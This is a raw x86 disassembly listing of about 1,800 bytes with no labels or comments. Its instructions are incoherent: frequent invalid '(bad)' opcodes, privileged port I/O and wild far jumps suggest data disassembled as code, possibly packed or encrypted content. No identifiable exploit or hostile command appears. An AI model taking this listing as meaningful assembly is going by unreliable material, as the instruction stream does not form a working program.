  41b6d8:	push   ecx
  41b6d9:	pop    ebp
  41b6da:	or     ebx,edi
  41b6dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6dd:	and    ecx,DWORD PTR [eax+edx*8-0x2497e51c]
  41b6e4:	fidivr WORD PTR [eax-0x58]
  41b6e7:	adc    ch,BYTE PTR [ebx-0x37c7a02a]
  41b6ed:	or     edx,eax
  41b6ef:	xchg   edi,eax
  41b6f0:	sbb    al,BYTE PTR [esi]
  41b6f2:	mov    eax,0x8dfb2053
  41b6f7:	aad    0x98
  41b6f9:	mov    ah,0xcd
  41b6fb:	dec    esi
  41b6fc:	out    0xf3,eax
  41b6fe:	pop    esp
  41b6ff:	out    0x7d,eax
  41b701:	arpl   WORD PTR [eax],dx
  41b703:	ins    WORD PTR es:[edi],dx
  41b705:	jmp    0x41b6ae
  41b707:	adc    eax,ebx
  41b709:	(bad)  
  41b70a:	lea    esp,[edx-0x59]
  41b70d:	sti    
  41b70e:	mov    BYTE PTR [ebp+0x10],bh
  41b711:	mov    eax,0x208f4283
  41b716:	cli    
  41b717:	push   edi
  41b718:	and    ah,BYTE PTR [ecx]
  41b71a:	xchg   esi,eax
  41b71b:	nop
  41b71c:	adc    ebx,edi
  41b71e:	xchg   ebx,eax
  41b71f:	pushf  
  41b720:	inc    edi
  41b721:	push   ebx
  41b722:	mov    ds:0x333cce61,al
  41b727:	cwde   
  41b728:	iret   
  41b729:	mov    ch,BYTE PTR [ebp+0x0]
  41b72c:	sub    bl,BYTE PTR [ecx-0x6ad371d2]
  41b732:	push   0x55
  41b734:	(bad)  
  41b735:	les    esi,FWORD PTR [eax]
  41b737:	inc    esi
  41b738:	mov    ds:0xd08b60ee,al
  41b73d:	and    al,0x30
  41b73f:	call   FWORD PTR [esi]
  41b741:	ins    BYTE PTR es:[edi],dx
  41b742:	mov    DWORD PTR [ebp+edi*1-0x36bb7783],ebx
  41b749:	xchg   ecx,eax
  41b74a:	std    
  41b74b:	gs and esi,ebx
  41b74e:	and    al,0x6a
  41b750:	or     al,0x9d
  41b752:	jle    0x41b72a
  41b754:	aam    0x19
  41b756:	sbb    DWORD PTR [edx-0x39],0x1fca1051
  41b75d:	cdq    
  41b75e:	mov    al,ds:0xd3d13835
  41b763:	xor    DWORD PTR [ecx-0x33645b51],ebp
  41b769:	bound  edx,QWORD PTR [ebx]
  41b76b:	xchg   edi,eax
  41b76c:	sti    
  41b76d:	add    eax,DWORD PTR [esi+0x2a]
  41b770:	addr16 push ss
  41b772:	dec    edi
  41b773:	(bad)  
  41b774:	(bad)  
  41b775:	imul   ebp,DWORD PTR [eax],0x702906d2
  41b77b:	cmp    al,0x22
  41b77d:	test   al,0x77
  41b77f:	sti    
  41b780:	mov    edi,0x8230dfdd
  41b785:	inc    edi
  41b786:	popf   
  41b787:	mov    ebx,DWORD PTR [ebp-0x77fca65a]
  41b78d:	push   esi
  41b78e:	or     dh,al
  41b790:	mov    eax,0x43ba6bd
  41b795:	aaa    
  41b796:	shl    edi,0xbc
  41b799:	mov    ebx,0xe9c8f5d3
  41b79e:	out    dx,al
  41b79f:	inc    edx
  41b7a0:	cmp    eax,0xb8d13be8
  41b7a5:	mov    DWORD PTR [edx-0x69],ebx
  41b7a8:	inc    ebp
  41b7a9:	sub    al,ch
  41b7ab:	nop
  41b7ac:	push   DWORD PTR [edx]
  41b7ae:	xor    eax,0xae676a9f
  41b7b3:	(bad)  
  41b7b4:	xchg   edi,eax
  41b7b5:	cs retf 0x3525
  41b7b9:	xchg   esp,eax
  41b7ba:	xor    BYTE PTR [edx+0x59],dh
  41b7bd:	out    dx,al
  41b7be:	retf   
  41b7bf:	pop    ebp
  41b7c0:	mov    bh,dh
  41b7c2:	push   eax
  41b7c3:	jb     0x41b79a
  41b7c5:	mov    esi,0xafb9e8f2
  41b7ca:	retf   0x3f2e
  41b7cd:	fs push es
  41b7cf:	cs jmp 0x41b757
  41b7d2:	xchg   ebx,eax
  41b7d3:	push   ss
  41b7d4:	push   ebx
  41b7d5:	and    BYTE PTR [esi-0x3d],0xbd
  41b7d9:	xor    al,0x32
  41b7db:	jb     0x41b781
  41b7dd:	icebp  
  41b7de:	into   
  41b7df:	mov    esp,0xc405c62
  41b7e4:	std    
  41b7e5:	fmulp  st(6),st
  41b7e7:	(bad)  
  41b7e8:	push   ds
  41b7e9:	aaa    
  41b7ea:	out    0x3e,al
  41b7ec:	lds    ebx,FWORD PTR [eax]
  41b7ee:	fcmovne st,st(5)
  41b7f0:	mov    al,0xd8
  41b7f2:	pushf  
  41b7f3:	(bad)  
  41b7f4:	jge    0x41b784
  41b7f6:	mov    dh,0xd4
  41b7f8:	ins    DWORD PTR es:[edi],dx
  41b7f9:	pop    edi
  41b7fa:	ds and al,0x6b
  41b7fd:	ja     0x41b827
  41b7ff:	leave  
  41b800:	fist   WORD PTR [esi+0x45c5a26f]
  41b806:	push   ebx
  41b807:	rcl    BYTE PTR [edx-0x72f7c16b],0xc
  41b80e:	(bad)  
  41b80f:	pushf  
  41b810:	test   BYTE PTR fs:[edi],dl
  41b813:	dec    esp
  41b814:	les    eax,FWORD PTR [ecx-0x52a7c384]
  41b81a:	and    esi,ebx
  41b81c:	ret    0xd030
  41b81f:	fsubr  st(1),st
  41b821:	mov    dh,0x6d
  41b823:	mov    BYTE PTR [ecx-0x26d99038],dl
  41b829:	or     al,0x68
  41b82b:	inc    ebp
  41b82c:	sar    BYTE PTR [ecx*4+0x6eb37583],1
  41b833:	mov    eax,0xf2d2a833
  41b838:	jae    0x41b884
  41b83a:	or     DWORD PTR [ecx+eax*4],ebx
  41b83d:	adc    DWORD PTR [ebp+0x1a],0xffffffc2
  41b841:	mov    dl,0xda
  41b843:	add    al,0xae
  41b845:	add    ah,BYTE PTR [edx-0x749a17f9]
  41b84b:	imul   ebp,eax,0x90c0e660
  41b851:	mov    eax,ds:0x71e4fbf6
  41b856:	cmp    al,0x68
  41b858:	test   DWORD PTR [ebx-0x45bcc6c],eax
  41b85e:	out    dx,eax
  41b85f:	sbb    al,0x8b
  41b861:	jecxz  0x41b8ce
  41b863:	je     0x41b7ee
  41b865:	mov    bh,0x72
  41b867:	add    eax,0xe8f93956
  41b86c:	mov    DWORD PTR ds:0x86c8d8e5,0x195e2443
  41b876:	jbe    0x41b87e
  41b878:	into   
  41b879:	test   DWORD PTR [edi+0x47d754fd],edx
  41b87f:	xchg   ecx,eax
  41b880:	out    dx,eax
  41b881:	xor    al,0x2
  41b883:	(bad)  
  41b884:	pop    edi
  41b885:	popf   
  41b886:	pop    ss
  41b887:	retf   0x5683
  41b88a:	jb     0x41b838
  41b88c:	mov    al,0xf8
  41b88e:	push   esp
  41b88f:	lea    ebx,[edi]
  41b891:	je     0x41b853
  41b893:	xor    bl,BYTE PTR [ebx]
  41b895:	je     0x41b912
  41b897:	shl    edi,1
  41b899:	std    
  41b89a:	sub    al,0xe6
  41b89c:	push   esp
  41b89d:	in     eax,dx
  41b89e:	xor    al,BYTE PTR [esi+0x65]
  41b8a1:	lds    ebx,FWORD PTR [edi-0x18a5faa6]
  41b8a7:	jecxz  0x41b908
  41b8a9:	mov    dh,0x5f
  41b8ab:	jmp    0x7386c415
  41b8b0:	push   ecx
  41b8b1:	mov    bh,0x5e
  41b8b3:	mov    edx,0xbb1bbb48
  41b8b8:	push   ebp
  41b8b9:	dec    edx
  41b8ba:	call   0x6ebcbc1f
  41b8bf:	push   ecx
  41b8c0:	std    
  41b8c1:	ja     0x41b92d
  41b8c3:	out    0xec,al
  41b8c5:	outs   dx,BYTE PTR ds:[esi]
  41b8c6:	add    eax,0xde1fb260
  41b8cb:	lods   eax,DWORD PTR ds:[esi]
  41b8cc:	nop
  41b8cd:	stos   BYTE PTR es:[edi],al
  41b8ce:	sbb    DWORD PTR [ebp+0x72f85733],esi
  41b8d4:	addps  xmm6,xmm3
  41b8d7:	adc    eax,edi
  41b8d9:	sub    ebp,eax
  41b8db:	mov    dh,0xc4
  41b8dd:	pop    edi
  41b8de:	or     al,0x1b
  41b8e0:	sar    DWORD PTR [edi],1
  41b8e2:	xor    al,0xf4
  41b8e4:	cld    
  41b8e5:	ins    DWORD PTR es:[edi],dx
  41b8e6:	js     0x41b86e
  41b8e8:	mov    dh,0xd7
  41b8ea:	xchg   DWORD PTR [ebx+0x512d624c],esp
  41b8f0:	and    esi,DWORD PTR [edx+edi*1+0x29f45861]
  41b8f7:	cwde   
  41b8f8:	or     eax,0x7fc2c475
  41b8fd:	dec    ecx
  41b8fe:	mov    ebp,0x13a334a6
  41b903:	xchg   edi,eax
  41b904:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b906:	sbb    DWORD PTR [bx],ecx
  41b909:	loop   0x41b89e
  41b90b:	sahf   
  41b90c:	and    ax,0x5b35
  41b910:	loopne 0x41b929
  41b912:	pop    eax
  41b913:	sub    DWORD PTR [ebp-0x5186dc7f],esi
  41b919:	push   esp
  41b91a:	(bad)  
  41b91b:	cmp    eax,0xdcc6609c
  41b920:	sub    edx,DWORD PTR [ebx+0x17]
  41b923:	das    
  41b924:	out    0x80,al
  41b926:	rol    BYTE PTR [ecx-0x7badd1ba],1
  41b92c:	cs idiv bl
  41b92f:	ss sbb eax,0x8a348627
  41b935:	mov    bl,0x49
  41b937:	iret   
  41b938:	rcr    DWORD PTR [esi+0x57ee21f8],0x9c
  41b93f:	ja     0x41b97b
  41b941:	pop    ecx
  41b942:	dec    edi
  41b943:	add    BYTE PTR [esi+0x2e],cl
  41b946:	sbb    eax,DWORD PTR [esi+0x41]
  41b949:	fnstenv [esp+edi*1-0x36]
  41b94d:	shr    DWORD PTR [edx],cl
  41b94f:	sub    bh,BYTE PTR [edi+0x17]
  41b952:	mov    dh,0xac
  41b954:	sbb    cl,BYTE PTR [eax]
  41b956:	sar    DWORD PTR [ebp+0x4951caaa],1
  41b95c:	xchg   DWORD PTR [ebx+0x36],eax
  41b95f:	or     ebx,DWORD PTR [ecx+0x30]
  41b962:	call   0x38fd:0x851434ff
  41b969:	stos   DWORD PTR es:[edi],eax
  41b96a:	mov    eax,0x6e537541
  41b96f:	dec    ebx
  41b970:	pop    esi
  41b971:	cwde   
  41b972:	dec    esi
  41b973:	sbb    eax,0xd3813dcb
  41b978:	pop    eax
  41b979:	imul   ebp,DWORD PTR [ecx-0x5e0e154e],0x0
  41b980:	jp     0x41b910
  41b982:	rol    BYTE PTR [ecx+0x2ee2dc96],0xcd
  41b989:	cmp    cl,ch
  41b98b:	test   al,0x19
  41b98d:	add    al,0x0
  41b98f:	mov    ah,0xb4
  41b991:	mov    ebp,0x390461
  41b996:	xor    DWORD PTR [ebx],edi
  41b998:	xchg   ebp,eax
  41b999:	and    al,0x2b
  41b99b:	push   edx
  41b99c:	jp     0x41b958
  41b99e:	or     esi,DWORD PTR [esi+0x3c03ec07]
  41b9a4:	cwde   
  41b9a5:	push   es
  41b9a6:	dec    DWORD PTR [edi-0x41ffea71]
  41b9ac:	and    al,0x6e
  41b9ae:	mov    DWORD PTR [edi+0x1c9b9f77],edx
  41b9b4:	sub    BYTE PTR [ecx+0x43b5f61b],bl
  41b9ba:	adc    cl,cl
  41b9bc:	cld    
  41b9bd:	pop    edx
  41b9be:	inc    ebx
  41b9bf:	and    BYTE PTR gs:[ecx-0x3dc7c824],cl
  41b9c6:	inc    ebx
  41b9c7:	into   
  41b9c8:	jecxz  0x41ba31
  41b9ca:	sbb    dh,BYTE PTR [esi]
  41b9cc:	imul   ebx,DWORD PTR [edx+0xe7db74b],0xcd4f4c0f
  41b9d6:	hlt    
  41b9d7:	inc    esi
  41b9d8:	pushf  
  41b9d9:	js     0x41b9bd
  41b9db:	aas    
  41b9dc:	addr16 jmp 0x17bf:0x1188bae0
  41b9e4:	jb     0x41ba17
  41b9e6:	pop    edi
  41b9e7:	dec    ebx
  41b9e8:	aaa    
  41b9e9:	push   ebp
  41b9ea:	mov    esp,0xb4a5798e
  41b9ef:	xor    esp,DWORD PTR [esi-0x64]
  41b9f2:	lods   eax,DWORD PTR ds:[esi]
  41b9f3:	cmp    eax,DWORD PTR [ecx-0x717cdccd]
  41b9f9:	inc    ecx
  41b9fa:	and    DWORD PTR ds:0x308ee753,ebp
  41ba00:	and    eax,edi
  41ba02:	jle    0x41ba67
  41ba04:	in     al,dx
  41ba05:	mov    esi,0x8b39940d
  41ba0a:	fistp  QWORD PTR [esp+ecx*1-0x20]
  41ba0e:	(bad)
  41ba11:	(bad)  
  41ba13:	pop    ebp
  41ba14:	jno    0x41ba1a
  41ba16:	inc    esp
  41ba17:	out    0xf8,al
  41ba19:	retf   0xc9ed
  41ba1c:	mov    al,ds:0x221a0eca
  41ba21:	push   edi
  41ba22:	push   eax
  41ba23:	and    al,0xc3
  41ba25:	pop    ecx
  41ba26:	cmp    DWORD PTR [ecx+ebx*8-0x2d536d0c],0x7
  41ba2e:	and    bl,BYTE PTR [ebx]
  41ba30:	fisubr DWORD PTR [edi]
  41ba32:	or     eax,0xb5326d3c
  41ba37:	sub    ch,BYTE PTR [ebx+0x3254eb31]
  41ba3d:	jp     0x41b9fa
  41ba3f:	popa   
  41ba40:	inc    edx
  41ba41:	mov    ds,WORD PTR [esi+ebp*1-0x1]
  41ba45:	inc    edi
  41ba46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba47:	mov    bl,ch
  41ba49:	pusha  
  41ba4a:	loop   0x41ba23
  41ba4c:	lds    edi,FWORD PTR [esi+ecx*4-0x659c7d57]
  41ba53:	xor    al,0x31
  41ba55:	in     al,0xc5
  41ba57:	sbb    eax,0x886e10a8
  41ba5c:	mov    bh,0x75
  41ba5e:	jmp    0xeaa8e484
  41ba63:	(bad)  
  41ba64:	out    0xd0,eax
  41ba66:	pop    ebx
  41ba67:	jp     0x41ba03
  41ba69:	add    eax,0xe6332cda
  41ba6e:	cmp    al,0xaa
  41ba70:	xor    ch,ch
  41ba72:	sbb    ah,BYTE PTR [esi]
  41ba74:	arpl   WORD PTR [ebx-0x1ab44b61],dx
  41ba7a:	lds    esp,FWORD PTR ss:[edi+0x135b7981]
  41ba81:	aam    0x29
  41ba83:	xchg   esi,eax
  41ba84:	push   0x28
  41ba86:	inc    esp
  41ba87:	mov    ds:0x2992fdfb,al
  41ba8c:	pop    ss
  41ba8d:	dec    esp
  41ba8e:	dec    ecx
  41ba8f:	frstor [ecx+0x3f]
  41ba92:	sub    bh,BYTE PTR [ebx-0x4f0a96f2]
  41ba98:	pop    ebp
  41ba99:	xor    eax,0x9a809f24
  41ba9e:	or     al,0x62
  41baa1:	xchg   DWORD PTR [esi-0x7b26e19e],eax
  41baa7:	mov    cl,0x60
  41baa9:	js     0x41bacc
  41baab:	fist   WORD PTR [ebp-0x22]
  41baae:	mov    ch,0x99
  41bab0:	in     eax,0x66
  41bab2:	sbb    ch,BYTE PTR [ebp+0x8]
  41bab5:	dec    ebx
  41bab6:	sbb    al,0xdf
  41bab8:	mov    ebp,0x418a4cbc
  41babd:	adc    BYTE PTR [edx-0xac08d14],al
  41bac3:	fdiv   QWORD PTR [eax+0x27744715]
  41bac9:	xchg   esp,eax
  41baca:	push   ds
  41bacb:	mov    ch,0xdb
  41bacd:	ret    0xd223
  41bad0:	xchg   esp,ebx
  41bad2:	repnz lds ebp,FWORD PTR [esi-0x33]
  41bad6:	and    eax,0xdf990543
  41badb:	push   es
  41badc:	imul   edx,DWORD PTR [ebx-0xc51706d],0x5dbb44f8
  41bae6:	add    eax,0x44693c8
  41baeb:	pop    ebp
  41baec:	jmp    0x41bb03
  41baee:	xchg   ebx,eax
  41baef:	sbb    edx,DWORD PTR [eax]
  41baf1:	sub    BYTE PTR [edi],0xfb
  41baf4:	xchg   BYTE PTR [edi],bl
  41baf6:	xor    edx,edi
  41baf8:	inc    ebx
  41baf9:	xor    ch,dh
  41bafb:	ins    BYTE PTR es:[edi],dx
  41bafc:	call   0xf9163720
  41bb01:	and    al,0x37
  41bb03:	popa   
  41bb04:	shl    edx,0x6
  41bb07:	inc    esp
  41bb08:	pop    ecx
  41bb0a:	cdq    
  41bb0b:	pop    esi
  41bb0c:	gs aaa 
  41bb0e:	dec    ebx
  41bb0f:	outs   dx,DWORD PTR ds:[esi]
  41bb10:	repz jo 0x41bae6
  41bb13:	std    
  41bb14:	cmp    BYTE PTR [ecx-0x51],ah
  41bb17:	cmp    al,0xd8
  41bb19:	dec    esp
  41bb1a:	lods   eax,DWORD PTR ds:[esi]
  41bb1b:	out    dx,al
  41bb1c:	jg     0x41bae1
  41bb1e:	iret   
  41bb1f:	jl     0x41bafa
  41bb21:	add    ecx,DWORD PTR [eax+0x24]
  41bb24:	sub    BYTE PTR [esi+0x7a],ah
  41bb27:	shl    DWORD PTR [edi],0x99
  41bb2a:	sub    al,0xc7
  41bb2c:	inc    eax
  41bb2d:	pop    ds
  41bb2e:	outs   dx,DWORD PTR ds:[esi]
  41bb2f:	loope  0x41baf5
  41bb31:	lahf   
  41bb32:	(bad)  
  41bb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb34:	jl     0x41bb5f
  41bb36:	xor    ecx,ebp
  41bb38:	mov    WORD PTR [ebp+0x24ee71cd],es
  41bb3e:	push   0x52
  41bb40:	imul   ebp,esp,0x3f3cc643
  41bb46:	jle    0x41bb6b
  41bb48:	gs sub edi,ecx
  41bb4b:	imul   ebx,DWORD PTR [eax+eax*1-0x5bd5217d],0x7e
  41bb53:	xchg   esp,eax
  41bb54:	pop    ebp
  41bb55:	ins    DWORD PTR es:[edi],dx
  41bb56:	arpl   WORD PTR [ebx+edx*4+0x1bd6a5a5],dx
  41bb5d:	ret    0x4d2
  41bb60:	jbe    0x41bb9b
  41bb62:	fisttp QWORD PTR [ecx+eiz*2+0x68]
  41bb66:	push   ebp
  41bb67:	mov    bh,0x3a
  41bb69:	mov    esi,0x5a911292
  41bb6e:	inc    ebp
  41bb6f:	or     BYTE PTR [ebx+0x7f],ch
  41bb72:	xchg   BYTE PTR [eax-0x7c183efe],cl
  41bb78:	jmp    0x7f03c3e3
  41bb7d:	test   DWORD PTR [edi],edx
  41bb7f:	stos   BYTE PTR es:[edi],al
  41bb80:	xchg   esi,eax
  41bb81:	fcmovnbe st,st(7)
  41bb83:	mov    al,ds:0x9b312829
  41bb88:	cmp    dl,BYTE PTR [ebp+0x26]
  41bb8b:	std    
  41bb8c:	push   0xfffffffb
  41bb8e:	dec    eax
  41bb8f:	dec    esi
  41bb90:	cdq    
  41bb91:	stos   BYTE PTR es:[edi],al
  41bb92:	push   ss
  41bb93:	scas   eax,DWORD PTR es:[edi]
  41bb94:	out    dx,al
  41bb95:	cs dec ebp
  41bb97:	sti    
  41bb98:	add    edx,DWORD PTR [edi]
  41bb9a:	sub    DWORD PTR [eax+0x3e8eb854],ebp
  41bba0:	adc    edx,DWORD PTR [ecx+0x5e]
  41bba3:	pushf  
  41bba4:	cli    
  41bba5:	mov    ds:0xf3e1ad12,eax
  41bbaa:	dec    edi
  41bbab:	jmp    0xefa2e62
  41bbb0:	js     0x41bc29
  41bbb2:	(bad)  
  41bbb3:	jmp    0xe014ab08
  41bbb8:	lods   al,BYTE PTR ds:[esi]
  41bbb9:	loope  0x41bb49
  41bbbb:	les    ebp,FWORD PTR [esi+0x641c323b]
  41bbc1:	adc    eax,0x86b3b0cd
  41bbc6:	jmp    0xdd59:0xd49f21f4
  41bbcd:	mov    WORD PTR [edi],cs
  41bbcf:	dec    ebx
  41bbd0:	pop    ds
  41bbd1:	add    DWORD PTR [edx-0x4e],0x6cbd9047
  41bbd8:	int3   
  41bbd9:	fmul   QWORD PTR [edx]
  41bbdb:	outs   dx,DWORD PTR ds:[esi]
  41bbdc:	fistp  QWORD PTR [edx+0x3a]
  41bbdf:	jp     0x41bbb0
  41bbe1:	xor    al,0xeb
  41bbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbe4:	(bad)  
  41bbe6:	jno    0x41bc38
  41bbe8:	iret   
  41bbe9:	int    0xf5
  41bbeb:	adc    eax,0x68bfc43f
  41bbf0:	jmp    0x41bc4d
  41bbf2:	adc    BYTE PTR [esp+eax*8-0x4c],bh
  41bbf6:	into   
  41bbf7:	sbb    ch,ah
  41bbf9:	push   edi
  41bbfa:	ret    
  41bbfb:	mov    eax,0x4957c199
  41bc00:	loopne 0x41bc64
  41bc02:	loopne 0x41bc14
  41bc04:	xchg   esi,eax
  41bc05:	inc    esi
  41bc06:	cli    
  41bc07:	nop
  41bc08:	std    
  41bc09:	pop    ss
  41bc0a:	hlt    
  41bc0b:	lock aam 0x6c
  41bc0e:	add    edi,DWORD PTR [edx-0x66]
  41bc11:	jo     0x41bbaa
  41bc13:	int3   
  41bc14:	leave  
  41bc15:	clc    
  41bc16:	(bad)  
  41bc17:	fs scas eax,DWORD PTR es:[edi]
  41bc19:	cmp    DWORD PTR [ecx+0x469af817],esi
  41bc1f:	mov    esi,0xc2f3ea6f
  41bc24:	mov    edx,0x6bde80bc
  41bc29:	jge    0x41bbaf
  41bc2b:	xchg   ebp,eax
  41bc2c:	xchg   DWORD PTR [esi],eax
  41bc2e:	push   ebx
  41bc2f:	in     al,0x2d
  41bc31:	and    eax,0x2a9a7de7
  41bc36:	dec    edi
  41bc37:	ror    DWORD PTR [ebx+0x20e9ed1f],0x2
  41bc3e:	inc    esi
  41bc3f:	xlat   BYTE PTR ds:[ebx]
  41bc40:	xchg   esp,eax
  41bc41:	std    
  41bc42:	loopne 0x41bc87
  41bc44:	in     al,dx
  41bc45:	in     eax,dx
  41bc46:	adc    BYTE PTR [edx-0x22],dh
  41bc49:	xchg   edi,eax
  41bc4a:	ret    0x8a24
  41bc4d:	and    esp,DWORD PTR [ecx]
  41bc4f:	in     al,dx
  41bc50:	(bad)  
  41bc51:	addr16 jns 0x41bbdb
  41bc54:	je     0x41bcc5
  41bc56:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41bc58:	dec    edx
  41bc59:	sbb    dl,BYTE PTR [ecx]
  41bc5b:	and    esi,DWORD PTR [eax]
  41bc5d:	rcr    BYTE PTR [esi],0x3f
  41bc60:	dec    edi
  41bc61:	aad    0x55
  41bc63:	pop    edi
  41bc64:	and    DWORD PTR [eax],0x2b
  41bc67:	ficomp WORD PTR [eax]
  41bc69:	sub    ebp,DWORD PTR [ebp+edi*4-0x6b]
  41bc6d:	fst    st(6)
  41bc6f:	mov    eax,DWORD PTR [ebx+0x2d]
  41bc72:	lock mov ds:0xffdce779,al
  41bc78:	xchg   esi,eax
  41bc79:	pop    edx
  41bc7a:	outs   dx,BYTE PTR ds:[esi]
  41bc7b:	inc    esi
  41bc7c:	and    bl,al
  41bc7e:	fsubr  DWORD PTR [ebx]
  41bc80:	fs es (bad) 
  41bc83:	jg     0x41bc60
  41bc85:	lahf   
  41bc86:	push   ebp
  41bc87:	fxtract 
  41bc89:	call   0x3a7dd906
  41bc8e:	stc    
  41bc8f:	push   edx
  41bc90:	ins    BYTE PTR es:[edi],dx
  41bc91:	inc    esi
  41bc92:	faddp  st(5),st
  41bc94:	inc    esi
  41bc95:	add    BYTE PTR [esi+0x259eaa2c],dh
  41bc9b:	jmp    0x41bcbd
  41bc9d:	pop    edi
  41bc9e:	(bad)  
  41bc9f:	ror    BYTE PTR [esi+0x10],1
  41bca2:	mov    edi,0x381bf464
  41bca7:	jae    0x41bc9e
  41bca9:	xchg   ecx,eax
  41bcaa:	xchg   ebx,eax
  41bcab:	mov    bl,0xdc
  41bcad:	push   ds
  41bcae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcaf:	mov    WORD PTR [ebx+0x60],gs
  41bcb2:	sti    
  41bcb3:	clc    
  41bcb4:	cld    
  41bcb5:	inc    eax
  41bcb6:	pop    eax
  41bcb7:	jp     0x41bc42
  41bcb9:	hlt    
  41bcba:	cwde   
  41bcbb:	push   0x73
  41bcbd:	mov    ds:0x567e3237,eax
  41bcc2:	call   0x979ec996
  41bcc7:	jae    0x41bc87
  41bcc9:	out    dx,al
  41bcca:	std    
  41bccb:	and    DWORD PTR [ecx+ebp*2],esi
  41bcce:	sbb    DWORD PTR [esi-0x12f7b3f0],ebx
  41bcd4:	inc    eax
  41bcd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcd6:	jb     0x41bc98
  41bcd8:	pop    ss
  41bcd9:	dec    edi
  41bcda:	inc    eax
  41bcdb:	mov    cl,0x1c
  41bcdd:	dec    edi
  41bcde:	std    
  41bcdf:	jl     0x41bcf6
  41bce1:	xchg   BYTE PTR [esi],bl
  41bce3:	lahf   
  41bce4:	mov    ds:0x1c445685,eax
  41bce9:	cmp    BYTE PTR [edx],0xfe
  41bcec:	sbb    al,0x7e
  41bcee:	or     eax,0xaf2f30c3
  41bcf3:	ss mov bl,0x3f
  41bcf6:	fld    QWORD PTR [ecx+ebx*4+0x3c4d0957]
  41bcfd:	cs xchg edi,eax
  41bcff:	xchg   ebp,eax
  41bd00:	mov    al,0xa3
  41bd02:	fisub  WORD PTR [ecx]
  41bd04:	add    DWORD PTR [eax],ebp
  41bd06:	lods   al,BYTE PTR ds:[esi]
  41bd07:	jo     0x41bcfb
  41bd09:	push   ss
  41bd0a:	mov    bh,al
  41bd0c:	cmc    
  41bd0d:	xor    edi,eax
  41bd0f:	iret   
  41bd10:	add    al,0x34
  41bd12:	push   0x40d68e99
  41bd17:	call   0xe080675b
  41bd1c:	mov    ecx,0x74e70eea
  41bd21:	mov    esp,0xe9aa3df6
  41bd26:	add    cl,bl
  41bd28:	loop   0x41bd89
  41bd2a:	xchg   BYTE PTR [ecx-0x27b303c7],dl
  41bd30:	mov    bp,0x4f88
  41bd34:	cmp    edi,edi
  41bd36:	pop    ss
  41bd37:	in     eax,0xf5
  41bd39:	fldenv [ebp+0xc]
  41bd3c:	call   edx
  41bd3e:	sub    eax,0x25f8819b
  41bd43:	repz retf 0x8758
  41bd47:	sbb    al,0xfd
  41bd49:	(bad)  
  41bd4a:	dec    esp
  41bd4b:	addr16 jnp 0x41bce1
  41bd4e:	loopne 0x41bd50
  41bd50:	pop    eax
  41bd51:	mov    WORD PTR [esi],gs
  41bd53:	arpl   WORD PTR [eax+0x76],di
  41bd56:	dec    edx
  41bd57:	int    0x10
  41bd59:	xor    esi,DWORD PTR [edx-0x1a]
  41bd5c:	popf   
  41bd5d:	push   esi
  41bd5e:	and    edx,esi
  41bd60:	fsub   QWORD PTR [ecx-0x7f]
  41bd63:	xor    WORD PTR [ebx],bp
  41bd66:	push   esp
  41bd67:	daa    
  41bd68:	mov    eax,fs:0xba3f5391
  41bd6e:	add    cl,BYTE PTR ds:0x9999ab2
  41bd74:	mov    cl,0x3a
  41bd76:	xchg   DWORD PTR [eax+eiz*2-0x2aaf1adb],esp
  41bd7d:	xchg   edx,eax
  41bd7e:	ja     0x41bdf7
  41bd80:	inc    ebp
  41bd81:	push   esp
  41bd82:	mov    edi,0x99c19b10
  41bd87:	push   esp
  41bd88:	or     DWORD PTR [ebp-0x1c319573],ebx
  41bd8e:	fs out dx,al
  41bd90:	dec    esp
  41bd91:	cmc    
  41bd92:	jns    0x41bdd6
  41bd94:	xchg   edi,eax
  41bd95:	sub    dl,dh
  41bd97:	sti    
  41bd98:	fwait
  41bd99:	xchg   ebp,eax
  41bd9a:	inc    edx
  41bd9b:	(bad)  
  41bd9d:	xchg   ebp,eax
  41bd9e:	jecxz  0x41bd76
  41bda0:	jg     0x41bdd3
  41bda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda3:	xchg   DWORD PTR [ebp+edi*2-0x1f],eax
  41bda7:	xor    ebx,DWORD PTR [ebp+0x24]
  41bdaa:	shl    ebx,cl
  41bdac:	clc    
  41bdad:	xor    al,0x3a
  41bdaf:	mov    bh,0xb0
  41bdb1:	retf   
  41bdb2:	fmul   DWORD PTR [eax*1-0x29af71fd]
  41bdb9:	cld    
  41bdba:	lahf   
  41bdbb:	dec    eax
  41bdbc:	jne    0x41bdef
  41bdbe:	(bad)  [ecx+edx*4]
  41bdc1:	ds jmp 0x41bdc1
  41bdc4:	cmp    DWORD PTR [ebx],0x72
  41bdc7:	cmp    DWORD PTR [ebp+0x7a],ecx
  41bdca:	adc    dl,al
  41bdcc:	sahf   
  41bdcd:	inc    esp
  41bdce:	fsub   QWORD PTR [edx+eax*4-0x1f]
  41bdd2:	xor    al,0xfe
  41bdd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdd5:	mov    esp,0x862dc116
  41bdda:	xor    eax,0x443d9ce3
  41bddf:	xchg   edx,ebp
  41bde1:	sub    al,0x9a
  41bde3:	and    ch,dh
  41bde5:	call   0x73d87662
  41bdea:	push   esp
  41bdeb:	and    eax,0xa1a3fb0c
  41bdf0:	and    ecx,DWORD PTR [esi-0x726c485c]
  41bdf6:	loopne 0x41be15
  41bdf8:	dec    ebp
  41bdf9:	adc    eax,0x1da963aa
  41bdfe:	pop    esi
  41bdff:	outs   dx,DWORD PTR ds:[esi]
  41be00:	sbb    BYTE PTR [ebx+0xfb002cf],dl
  41be06:	not    DWORD PTR [ebx]
  41be08:	mov    cl,0xe
  41be0a:	jecxz  0x41bdcb
  41be0c:	or     eax,0x57cf8af7
  41be11:	lods   eax,DWORD PTR ds:[esi]
  41be12:	leave  
  41be13:	clc    
  41be14:	add    edi,esi
  41be16:	arpl   WORD PTR [esp+ebp*2-0x5976a8f9],si
  41be1d:	cdq    
  41be1e:	push   esp
  41be1f:	cs gs loope 0x41be62
  41be23:	cwde   
  41be24:	sub    BYTE PTR [ecx+0x1c],0xc5
  41be28:	in     al,dx
  41be29:	add    eax,0x9069ab71
